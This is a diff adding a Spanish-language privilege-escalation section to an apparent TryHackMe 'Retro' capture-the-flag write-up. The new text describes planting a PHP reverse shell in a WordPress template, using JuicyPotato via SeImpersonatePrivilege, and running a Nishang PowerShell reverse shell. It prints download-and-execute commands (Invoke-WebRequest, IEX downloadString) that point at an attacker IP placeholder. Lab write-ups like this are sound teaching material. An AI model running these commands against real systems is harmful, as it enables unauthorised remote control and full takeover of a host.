@@ -135,8 +135,108 @@ Aqui ya pude obtener la primer flag que es `user.txt`
 
 ## Escalada de Privilegios
 
+Abri una shell y comence a revisar informacion del sistemas, los usuarios, grupos y permisos que hay con el usuario Wade
+
+![](/assets/images/THM/retro/14.png)
+
+![](/assets/images/THM/retro/15.png)
+
+![](/assets/images/THM/retro/16.png)
+
+Con estos resultados pude ver que el usuario no tiene privilegios para usar algun ataque de escalada de privilegios, tambien vi que estamos en Windows Server 2016 y tambien vi la version del SO.
+
+Por lo que intente probar un ataque con Juicy Potato al privilegio SeImpersonatePrivilege, pero para poder hacer ese ataque tuve que encontrar una cuenta de bajos privilegios que tuviera el privilegio SeImpersonatePrivilege.
+
+Entonces lo que hice fue conseguir una reverse shell en php desde el WordPress de la siguiente manera; Editando una de las plantillas de la pagina, que esta en lenguaje php, por lo que edite la plantilla `index.php` y borre su contenido y lo que hice despues fue pegar un script de una [reverse shell](https://github.com/ivan-sincek/php-reverse-shell) en php.
+
+![](/assets/images/THM/retro/17.png)
+
+En ese script se debe cambiar la dirección IP y el puerto, donde queremos obtener la reverse shell, despues de eso, guardamos la plantilla.
+
+Despues de haber cambiado los parametros anteriores y haber guardado la edicion del tema; en una ventana de consola en nuestra maquina, ejecutamos un netcat de escucha 
+
+![](/assets/images/THM/retro/18.png)
+
+Entonces ya teniendo estos pasos, recargo la pagina inicial del servicio web y reviso el netcat de escucha a ver si ya tenia la reverse shell
+
+![](/assets/images/THM/retro/19.png)
+
+De nuevo reviso la informacion de sistema, los usuarios y permisos
+
+![](/assets/images/THM/retro/20.png)
+
+Aqui obtuve la reverse shell con otro usuario y es el usuario retro, y este usuario si tiene el privilegio SeImpersonatePrivilege, así que intente un ataque juicy potato en esta shell del usuario retro.
+
+Suelo crearme un directorio temp en la raiz del sistema y poder ahi trabajar de forma organizada
+
+```
+C:\inetpub\wwwroot\retro>cd C:\                                                      
+
+C:\>mkdir temp
+
+C:\>cd temp
+
+C:\temp>
+```
+
+### Juicy Potato
+
+Primero, descargue el exploit en su ultima version [aquí](https://github.com/ohpe/juicy-potato/releases)
+
+Segundo, lo transferí a la maquina objetivo de la siguiente forma.
+
+* Montando un servidor http desde la ruta del directorio donde se encuentra el exploit descargado.
+
+  ![](/assets/images/THM/retro/21.png)
+
+* Desde la consola Windows me descargo el archivo con el siguiente comando
+
+  `Invoke-WebRequest http://<IP Atacante>/JuicyPotato.exe -OutFile jp.exe`
+
+  ![](/assets/images/THM/retro/22.png)
+
+Ejecutamos el exploit para ver si se ejecuta bien.
+
+![](/assets/images/THM/retro/23.png)
+
+En este punto necesitaba otro shell inverso que hara que obtengamos una shell SYSTEM de nuestro lado, haciendo uso de esta [Shell Inversa](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) de Nishang.
+
+Me la descargue en mi maquina, y luego edite el archivo añadiendo a la ultima linea el siguiente comando:
+
+`Invoke-PowerShellTcp -Reverse -IPAddress <IP Atacante> -Port <port>`
+
+![](/assets/images/THM/retro/24.png)
+
+Ahora lo que hice fue tranferir este archivo a la maquina objetivo 
+
+![](/assets/images/THM/retro/25.png)
+
+![](/assets/images/THM/retro/26.png)
+
+Ya despues de tener eso, necesitaba algo que ejecutara el shell inverso por lo que tuve que crear en mi maquina un archivo .bat con la siguiente intruccion de comandos `PowerShell “IEX(New-Object Net.WebClient).downloadString(‘http://<IP>/Invoke-PowerShellTcp.ps1')"`
+
+Y luego ese archivo transferirlo a la maquina objetivo.
+
+![](/assets/images/THM/retro/27.png)
+
+![](/assets/images/THM/retro/28.png)
+
+Tambien puse un netcat en escucha en mi maquina, para cuando lance el JuicyPotato, obtenga la shell SYSTEM
+
+![](/assets/images/THM/retro/31.png)
 
 
+Entonces lance el siguiente comando del exploit para asi generar la shell inversa en nuestra maquina
+
+![](/assets/images/THM/retro/30.png)
+
+Y cuando revise el netcat de escucha ya tenia la shell inversa
+
+![](/assets/images/THM/retro/29.png)
+
+Aqui ya podemos obtener la flag de `root.txt` para completar la tarea de TryHackMe
+
+![](/assets/images/THM/retro/32.png)
 
 
 
